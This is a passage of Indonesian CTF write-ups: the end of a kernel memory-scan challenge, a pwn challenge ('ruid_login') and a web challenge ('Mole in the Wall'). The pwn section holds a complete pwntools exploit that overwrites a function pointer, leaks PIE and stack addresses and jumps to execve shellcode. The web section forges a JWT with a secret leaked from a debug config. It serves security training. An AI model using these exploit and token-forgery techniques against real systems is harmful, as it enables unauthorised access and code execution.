+### “Exploit” yang dipakai: scan memory buat string flag
+
+Karena ini CTF, flag formatnya `RUSEC{...}`. Jadi exploit termurah adalah: *scan kernel memory leak sampai ketemu substring itu*.
+
+Core loop di `find_rusec.c`:
+
+```c
+for (off = 0x1000; off < end; off += 0x50) {
+  pread(ac, buf, 0x50, off);
+  if (memmem(window, sizeof(window), "RUSEC{", 6)) {
+    pread(ac, out, 0x50, hit_off + 0x00);
+    pread(ac, out, 0x50, hit_off + 0x50);
+    pread(ac, out, 0x50, hit_off + 0xa0);
+    pread(ac, out, 0x50, hit_off + 0xf0);
+    if (strchr(out, '}')) print(out);
+  }
+}
+```
+
+Compile:
+
+```bash
+$ gcc -O2 -static -s -o find_rusec find_rusec.c
+```
+
+Upload ke catbox (yang gampang dan nggak ribet MIME-type):
+
+```bash
+$ curl -fsS \
+  -F reqtype=fileupload \
+  -F "fileToUpload=@find_rusec" \
+  https://catbox.moe/user/api.php
+
+https://files.catbox.moe/xnh9oq
+```
+
+Paste URL itu ke `nc`, lalu di shell remote jalankan:
+
+```sh
+/ $ /mnt/exploit 0x10000000
+found 'RUSEC{' at offset 0x45fdfac
+candidate: RUSEC{k3rnel_p4nic_n0t_sp4cetiming}
+```
+
+### Flag
+
+`RUSEC{k3rnel_p4nic_n0t_sp4cetiming}`
+
+---
+
+## ruid_login — PWN
+
+Target: `nc challs.ctf.rusec.club 4622`
+
+### Intro
+Di awal, ini kelihatan seperti “login system” biasa: masukin netID, lalu masukin RUID. Tapi semakin lama saya mainin, vibes-nya berubah jadi: *“ini kampus, tapi kok ada function pointer di table user?”*
+
+Write-up ini saya mulai dari recon, bedah flow, nemu bug, sampai eksploit yang benar-benar dipakai di PoC (`solve.py`) untuk ngeluarin flag.
+
+---
+
+### Recon: kenalan dulu sama binarinya
+
+Saya mulai dari yang paling standar: cek jenis ELF, mitigasi, dan string yang “berisik”.
+
+```bash
+$ file ruid_login
+ruid_login: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
+
+$ checksec --file=ruid_login
+[*] '/root/ctf/scarlet/pwn/ruid_login/ruid_login'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    PIE:        PIE enabled
+    Stack:      Executable
+    RWX:        Has RWX segments
+```
+
+Dua baris yang langsung bikin mata melek:
+
+- `Stack: Executable` (GNU_STACK `RWE`)
+- `Has RWX segments`
+
+Artinya: kalau saya bisa lompat ke data yang saya kontrol, *shellcode is on the menu*.
+
+Lanjut, saya cari fungsi-fungsi yang menarik:
+
+```bash
+$ nm -n ruid_login | rg ' T '
+00000000000011d9 T list_ruids
+0000000000001264 T get_number
+00000000000012f3 T prof
+00000000000014d2 T dean
+000000000000156d T setup_users
+0000000000001667 T main
+```
+
+Alamat di atas masih **PIE-relative offsets** (runtime base random), tapi ini penting untuk tahap leak nanti.
+
+Terus saya dump ASM bagian yang relevan:
+
+```bash
+$ objdump -d -Mintel ruid_login --disassemble=main
+$ objdump -d -Mintel ruid_login --disassemble=dean
+$ objdump -d -Mintel ruid_login --disassemble=setup_users
+$ objdump -d -Mintel ruid_login --disassemble=list_ruids
+```
+
+Dan buat konfirmasi soal executable stack:
+
+```bash
+$ readelf -l ruid_login | rg GNU_STACK -n
+  GNU_STACK      0x0000000000000000 ...  RWE
+```
+
+---
+
+### Read the Code
+
+Karena binary **not stripped**, reversing-nya enak. Saya fokus ke 4 bagian: `setup_users`, `list_ruids`, `dean`, dan `main`.
+
+#### 1) `setup_users()` — bikin “database” user (dan RUID-nya pakai `rand()`)
+
+Offset: `setup_users = 0x156d`
+
+Pseudocode (hasil convert dari flow ASM):
+
+```c
+struct user {
+  char name[0x20];
+  void (*func)();   // offset 0x20
+  uint64_t ruid;    // offset 0x28
+};
+
+user users[2];
+
+void setup_users(void) {
+  char *names[2] = {"Professor", "Dean"};
+  void (*funcs[2])() = {prof, dean};
+
+  for (int i = 0; i <= 1; i++) {
+    strcpy(users[i].name, names[i]);
+    users[i].ruid = (uint64_t)rand();   // default seed → deterministik
+    users[i].func = funcs[i];
+  }
+}
+```
+
+Ini menjelaskan kenapa RUID “admin” ternyata bisa ditebak: `rand()` nggak di-seed (`srand()` nggak ada), jadi output-nya konsisten.
+
+Di glibc, output awal `rand()` (seed default) adalah:
+
+- `Professor RUID = 1804289383` (`0x6b8b4567`)
+- `Dean RUID = 846930886` (`0x327b23c6`)
+
+---
+
+#### 2) `list_ruids()` — nge-print list user, tapi RUID “disensor”
+
+Offset: `list_ruids = 0x11d9`
+
+Pseudocode:
+
+```c
+void list_ruids(void) {
+  puts("");
+  for (int i = 0; i <= 1; i++) {
+    printf("[%d] {RUID REDACTED} %s\n", i, users[i].name);
+  }
+  puts("");
+}
+```
+
+Perhatikan: `%s` untuk `users[i].name`.
+
+Kalau `name` **nggak null-terminated**, `printf("%s")` akan terus “bleed” membaca memory setelahnya sampai ketemu `\0`.
+
+Simpan itu dulu.
+
+---
+
+#### 3) `dean()` — fitur admin yang jadi senjata
+
+Offset: `dean = 0x14d2`
+
+Pseudocode (inti exploit):
+
+```c
+void dean(void) {
+  puts("Change a staff member's name!");
+  list_ruids();
+  unsigned idx;
+  if (!get_number(&idx, 2)) return;
+
+  printf("New name: ");
+  read(0, &users[idx], 0x29);  // <-- bug: nulis melewati name[0x20]
+}
+```
+
+`read(0, &users[idx], 0x29)` itu *ngegas banget*:
+
+- `name` cuma `0x20`
+- tapi dia nulis `0x29`
+
+Layout yang kena:
+
+```
+users[idx].name[0x20]  -> kita kontrol
+users[idx].func (8)    -> kita bisa overwrite
+users[idx].ruid (8)    -> kita overwrite 1 byte (karena total 0x29)
+```
+
+Jadi ini bukan “buffer overflow ke RIP”. Ini jauh lebih *clean*:
+
+> Kita bisa **ganti function pointer** yang dipanggil saat login.
+
+---
+
+#### 4) `main()` — login, compare RUID, lalu `call user.func`
+
+Offset: `main = 0x1667`
+
+Pseudocode:
+
+```c
+int main(void) {
+  setup_users();
+  puts("Welcome to Rutgers University!");
+  printf("Please enter your netID: ");
+
+  char netid[0x40] = {0};
+  read(0, netid, 0x40);
+  netid[strcspn(netid, "\n")] = 0;
+  printf("Accessing secure interface as netid '%s'\n", netid);
+
+  while (!feof(stdin)) {
+    list_ruids();
+    printf("Please enter your RUID: ");
+    uint64_t ruid;
+    scanf("%lu%*c", &ruid);
+    printf("Logging in as RUID %lu..\n", ruid);
+
+    int ok = 0;
+    for (int i = 0; i <= 1; i++) {
+      if (users[i].ruid == ruid) {
+        printf("\nWelcome, %s!\n", users[i].name);
+        users[i].func();        // <-- target kita
+        putchar('\n');
+        ok = 1;
+      }
+    }
+    if (!ok) puts("No match!");
+  }
+}
+```
+
+Buat pwn-er, ini enak: cukup bikin `users[0].func` jadi alamat yang kita mau, lalu login sebagai Professor.
+
+---
+
+### Eksploit: dari “edit nama” → leak PIE → leak stack → shell
+
+Saya pakai exploit 3 tahap:
+
+#### Tahap 0 — login admin tanpa brute force
+
+Karena RUID-nya `rand()` default, kita bisa langsung pakai:
+
+- `RUID_DEAN  = 846930886`
+- `RUID_PROF  = 1804289383`
+
+---
+
+#### Tahap 1 — leak PIE base lewat string yang “nggak kelar”
+
+Trik: di Dean, saya tulis **tepat 0x20 byte** ke `users[0].name` (tanpa `\0`).
+
+Akibatnya, saat `list_ruids()` nge-print `%s`, dia “bleed” ke field berikutnya dan menampilkan bytes dari `users[0].func` (pointer ke `prof`).
+
+Di runtime, yang kebocor itu address `prof()`:
+
+- `prof` offset = `0x12f3`
+- leak memberi `prof_ptr`
+- maka `pie_base = prof_ptr - 0x12f3`
+
+Ini persis yang dilakukan PoC.
+
+---
+
+#### Tahap 2 — leak stack pointer pakai `puts@plt`
+
+Sekarang kita sudah tahu PIE base. Jadi kita bisa hitung:
+
+- `puts@plt` offset = `0x1050`
+- `puts_plt = pie_base + 0x1050`
+
+Lalu overwrite:
+
+- `users[0].func = puts_plt`
+
+Satu catatan kecil tapi penting: overwrite Dean nulis `0x29` byte, artinya **byte pertama `ruid` ikut berubah**.
+Supaya login Professor tetap match, saya paksa byte LSB RUID Professor tetap `0x67` (karena `0x6b8b4567`).
+
+Saat login sebagai Professor, program akan “memanggil” function pointer itu. Karena signature `puts()` beda, ia akan menggunakan register yang kebetulan masih berisi pointer stack (stale `rdi`) dan mencetak beberapa byte yang bisa kita parse jadi pointer.
+
+Dari output `puts`, saya dapat satu pointer stack (`leaked_ptr`).
+
+Lalu, secara empiris (divalidasi lokal), alamat buffer `netid` berada di:
+
+> `netid_addr = leaked_ptr + 0x1c0`
+
+Offset `0x1c0` ini juga dipakai PoC (`DELTA_PTR_TO_NETID = 0x1C0`).
+
+---
+
+#### Tahap 3 — taruh shellcode di netID, lompat ke sana
+
+Karena stack executable, saya isi input `netID` dengan:
+
+- 1 byte `\x00` (biar printing `%s` aman)
+- NOP sled
+- shellcode `execve("/bin//sh")`
+
+Lalu overwrite lagi:
+
+- `users[0].func = netid_addr + 1` (skip NUL, langsung ke NOP sled)
+
+Login Professor sekali lagi → `call users[0].func()` → langsung masuk shellcode → `sh`.
+
+Di remote, cukup `cat flag`.
+
+---
+
+### PoC
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+import time
+
+context.arch = "amd64"
+context.log_level = "info"
+
+HOST = "challs.ctf.rusec.club"
+PORT = 4622
+
+RUID_PROF = 1804289383
+RUID_DEAN = 846930886
+RUID_PROF_LSB = 0x67  # 1804289383 == 0x6b8b4567
+
+# From local reversing (PIE-relative offsets)
+PROF_OFF = 0x12F3
+PUTS_PLT_OFF = 0x1050
+
+# Empirically stable for this binary/libc: leaked_ptr -> &netid buffer delta
+DELTA_PTR_TO_NETID = 0x1C0
+
+
+def build_netid_shellcode() -> bytes:
+    sc = asm(shellcraft.sh())
+    # Make the program's `%s` printing harmless by NUL-terminating immediately,
+    # but keep executable bytes right after it (we'll jump past the NUL).
+    prefix = b"\x00"
+    netid = prefix + (b"\x90" * (0x40 - len(prefix) - len(sc))) + sc
+    assert len(netid) == 0x40
+    assert b"\n" not in netid
+    return netid
+
+
+def recv_prompt(p) -> None:
+    p.recvuntil(b"RUID: ")
+
+
+def dean_write(p, idx: int, raw: bytes) -> None:
+    recv_prompt(p)
+    p.sendline(str(RUID_DEAN).encode())
+    p.recvuntil(b"Num: ")
+    p.sendline(str(idx).encode())
+    p.send(raw)
+
+
+def solve_once() -> tuple[remote, int, int]:
+    p = remote(HOST, PORT)
+    p.timeout = 3
+    try:
+        p.recvuntil(b"netID: ", timeout=3)
+        p.send(build_netid_shellcode())
+
+        # Leak PIE via list_ruids by removing the NUL terminator of users[0].name (write only 0x20 bytes).
+        dean_write(p, 0, b"A" * 0x20)
+        blob = p.recvuntil(b"RUID: ", timeout=3)
+        marker = b"[0] {RUID REDACTED} "
+        i = blob.index(marker) + len(marker)
+        j = blob.index(b"\n", i)
+        line = blob[i:j]
+        prof_ptr = u64(line[0x20:].ljust(8, b"\x00"))
+        pie_base = prof_ptr - PROF_OFF
+
+        # Set users[0].func = puts@plt to leak a stack-ish pointer (and preserve the prof RUID LSB).
+        puts_plt = pie_base + PUTS_PLT_OFF
+        dean_write(p, 0, b"B" * 0x20 + p64(puts_plt) + bytes([RUID_PROF_LSB]))
+
+        # Trigger puts and parse leaked pointer; if it contains a newline byte, parsing may split early.
+        recv_prompt(p)
+        p.sendline(str(RUID_PROF).encode())
+        p.recvuntil(b"!\n", timeout=3)
+        post = p.recvuntil(b"RUID: ", timeout=3)
+        prefix = post.split(b"\n", 1)[0]
+        if len(prefix) < 5:
+            raise ValueError("puts leak contained newline; retry")
+        leaked_ptr = u64(prefix.ljust(8, b"\x00"))
+
+        return p, pie_base, leaked_ptr
+    except Exception:
+        try:
+            p.close()
+        finally:
+            raise
+
+
+def main():
+    for attempt in range(1, 51):
+        try:
+            p, pie_base, leaked_ptr = solve_once()
+            break
+        except Exception as e:
+            log.warning("retrying (%d/50): %r", attempt, e)
+            time.sleep(0.15)
+    else:
+        raise SystemExit("failed after 50 attempts")
+
+    netid_addr = leaked_ptr + DELTA_PTR_TO_NETID
+    jump_addr = netid_addr + 1  # skip the leading NUL we placed
+    log.info("pie_base=%#x leaked_ptr=%#x netid_addr=%#x", pie_base, leaked_ptr, netid_addr)
+
+    # Overwrite users[0].func with stack address of netID buffer (shellcode lives there).
+    recv_prompt(p)
+    p.sendline(str(RUID_DEAN).encode())
+    p.recvuntil(b"Num: ")
+    p.sendline(b"0")
+    p.send(b"C" * 0x20 + p64(jump_addr) + bytes([RUID_PROF_LSB]))
+
+    # Trigger shell and get the flag.
+    recv_prompt(p)
+    p.sendline(str(RUID_PROF).encode())
+    p.sendline(b"cat flag* 2>/dev/null; cat /flag 2>/dev/null; exit")
+    print(p.recvall(timeout=4).decode(errors="ignore"))
+
+
+if __name__ == "__main__":
+    main()
+```
+Jalankan:
+
+```bash
+python3 solve.py
+```
+
+Contoh output (akan beda karena ASLR):
+
+```text
+[+] Opening connection to challs.ctf.rusec.club on port 4622: Done
+[*] pie_base=0x569910021000 leaked_ptr=0x7ffc46e38b80 netid_addr=0x7ffc46e38d40
+[+] Receiving all data: Done (148B)
+[*] Closed connection to challs.ctf.rusec.club port 4622
+Logging in as RUID 1804289383..
+
+Welcome, CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAF\x7f!
+RUSEC{w0w_th4ts_such_a_l0ng_net1D_w4it_w4it_wh4ts_g0ing_0n_uh_0h}
+```
+
+### Flag
+
+`RUSEC{w0w_th4ts_such_a_l0ng_net1D_w4it_w4it_wh4ts_g0ing_0n_uh_0h}`
+
+---
+
+## Mole in the Wall – WEB
+
+Target: `https://girlypies.ctf.rusec.club`
+
+### Intro
+
+“Bonita the Yellow Rabbit lagi kumat.”  
+Kalimat itu kerasa kayak lore… tapi buat web challenge, biasanya artinya cuma satu: **ada sesuatu yang *should not be public*** tapi kepencet jadi public.
+
+Targetnya `https://girlypies.ctf.rusec.club` kelihatan rapi—landing page, about, contact—semuanya aman-aman aja. Tapi hintnya nyenggol langsung ke titik lemah:
+
+> “They tend to get their security from a JSON in debug/config…”
+
+Kalau sebuah aplikasi *ngambil security config dari file debug* dan itu kebuka ke internet, itu bukan “quirky”. Itu pintu belakang.
+
+Di write-up ini aku ceritain alurnya dari recon, nemu config leak, bikin JWT palsu, sampai akhirnya “nightguard login” ngasih kita ZIP berisi petunjuk yang nge-lead ke flag.
+
+---
+
+### Recon: peta dulu, baru nyasar
+
+Pertama, cek halaman-halaman yang obvious:
+
+```bash
+curl -s https://girlypies.ctf.rusec.club/ | head
+curl -s https://girlypies.ctf.rusec.club/login | head
+```
+
+Halaman `/login` menarik karena dia minta **Security Token** (bukan username/password). Artinya autentikasinya kemungkinan **token-based** (dan hint sudah bilang “security dari JSON”).
+
+Tes login random:
+
+```bash
+curl -s -X POST https://girlypies.ctf.rusec.club/login \
+  -d 'token=abc' | rg -n 'Unauthorized|VIOLATION|BITE' || true
+```
+
+Responsnya tegas: unauthorized.
+
+---
+
+### “debug/config”: mulai dari yang disuruh hint
+
+Hint-nya spesifik banget, jadi aku fokus nembak file config yang paling masuk akal:
+
+```bash
+curl -s https://girlypies.ctf.rusec.club/debug/config/security.json
+```
+
+Hasilnya *jackpot*:
+
+```json
+{
+  "audience": null,
+  "issuer": null,
+  "jwt": {
+    "algorithm": "HS256",
+    "required_claims": {
+      "department": "security",
+      "role": "nightguard",
+      "shift": "night"
+    }
+  }
+}
+```
+
+Jadi token yang valid adalah JWT HS256, dan wajib punya claim:
+
+- `department=security`
+- `role=nightguard`
+- `shift=night`
+
+Oke… tapi HS256 tetap butuh secret. Dan karena ini “debug/config”, langkah berikutnya: cari `.env`.
+
+```bash
+curl -s https://girlypies.ctf.rusec.club/debug/config/.env
+```
+
+Yang keluar bukan file `.env` biasa—dia dibungkus jadi JSON:
+
+```json
+{"JWT_SECRET":"g0ld3n_fr3ddy_w1ll_a1ways_b3_w@tch1ng_y0u"}
+```
+
+Selesai. Kalau secret udah bocor, JWT tinggal formalitas.
+
+---
+
+### Forge JWT: ketika “security token” itu cuma tanda tangan
+
+Aku pakai Python + PyJWT buat bikin token.
+
+Catatan penting: aku sempat memasukkan `iat/exp` (biar “lebih realistis”), tapi server justru *menolak* dan balikin halaman unauthorized. Token yang diterima adalah yang **hanya berisi required_claims**.
+
+Script untuk generate token:
+
+```py
+import jwt
+import requests
+
+base = "https://girlypies.ctf.rusec.club"
+secret = requests.get(base + "/debug/config/.env").json()["JWT_SECRET"]
+
+claims = {"department": "security", "role": "nightguard", "shift": "night"}
+token = jwt.encode(claims, secret, algorithm="HS256")
+print(token)
+```
+
+Terus kirim ke login:
+
+```bash
+python3 make_jwt.py > token.txt
+
+curl -s -X POST https://girlypies.ctf.rusec.club/login \
+  -d "token=$(cat token.txt)" \
+  -o nightguard.zip
+file nightguard.zip
+```
+
+Dan `file` mengonfirmasi: **itu ZIP**.
+
+---
+
+### Isi ZIP: “hadiah login” yang terlalu banyak cerita
+
+List dulu isinya:
+
+```bash
+unzip -l nightguard.zip
+```
+
+Yang paling relevan:
+
+- `logs/session.log`
+- `config/settings.xml`
+- `Microsoft.Flow/.../definition.json` (Power Automate / Flow “definition”)
+
+`config/settings.xml` memberi arah endpoint internal:
+
+```xml
+<root><network><path>/api/run-flow</path></network></root>
+```
+
+Dan salah satu `definition.json` (flow maintenance mode) menampilkan logika yang jelas: dia baca `logs/session.log`, lalu **mengurangi 1 dari ASCII tiap karakter** untuk membentuk `FinalVar`, dan membandingkannya dengan input teknisi.
+
+Kalau diubah jadi pseudocode singkat:
+
+```text
+enc = read("logs/session.log")
+final = ""
+for each char c in enc:
+    final += chr(ord(c) - 1)
+if AuthCode == final:
+    POST /api/run-flow { "input": final }
+```
+
+Nah, `logs/session.log` isinya:
+
+```text
+u$bu_qvsqm4_hvz
+```
+
+Decode-nya (ASCII - 1):
+
+```py
+enc = "u$bu_qvsqm4_hvz"
+dec = "".join(chr(ord(c) - 1) for c in enc)
+print(dec)  # t#at^purpl3^guy
+```
+
+Jadi *clearance code* yang diincar flow: `t#at^purpl3^guy`.
+
+---
+
+### /api/run-flow: satu karakter yang bikin semua beda
+
+Coba langsung ke API:
+
+```bash
+curl -s https://girlypies.ctf.rusec.club/api/run-flow \
+  -H 'Content-Type: application/json' \
+  -d '{"input":"t#at^purpl3^guy"}'
+```
+
+Balik `403 {"error":"invalid input"}`.
+
+Di sini aku curiga ada validasi karakter (misalnya whitelist `[a-z0-9_#]`). Jadi aku lakukan “tebakan tajam” yang paling murah: **ganti `^` jadi `_`** (karena sering ketuker di puzzle).
+
+```bash
+curl -s https://girlypies.ctf.rusec.club/api/run-flow \
+  -H 'Content-Type: application/json' \
+  -d '{"input":"t#at_purpl3_guy"}'
+```
+
+Dan akhirnya:
+
+```json
+{"result":"RUSEC{m1cro$oft_n3ver_mad3_g00d_aut0m4t1on}"}
+```
+
+Flag keluar, Bonita bisa balik ke panggung.
+
+### Flag
+
+`RUSEC{m1cro$oft_n3ver_mad3_g00d_aut0m4t1on}`
+
+---
